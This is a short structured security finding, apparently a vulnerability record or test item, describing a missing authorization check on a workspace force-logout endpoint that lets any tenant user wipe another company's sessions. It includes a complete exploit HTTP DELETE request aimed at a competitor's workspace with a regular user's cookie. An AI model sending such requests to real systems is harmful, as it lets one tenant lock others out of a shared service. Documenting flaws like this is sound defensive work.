diagnosis: The endpoint executes a deleteMany operation directly on the connect-mongo collection using req.params.workspaceId without verifying that the authenticated user is a workspace administrator for that workspaceId. Any tenant user can specify arbitrary competitor workspace IDs, instantly kicking all employees and admins off the system.
exploit_request:
DELETE /api/workspaces/ws_competitor_corp_9901/force-logout HTTP/1.1
Host: workspace.collab.internal:4044
Cookie: connect.sid=s%3Aregular_tenant_user
Accept: application/json
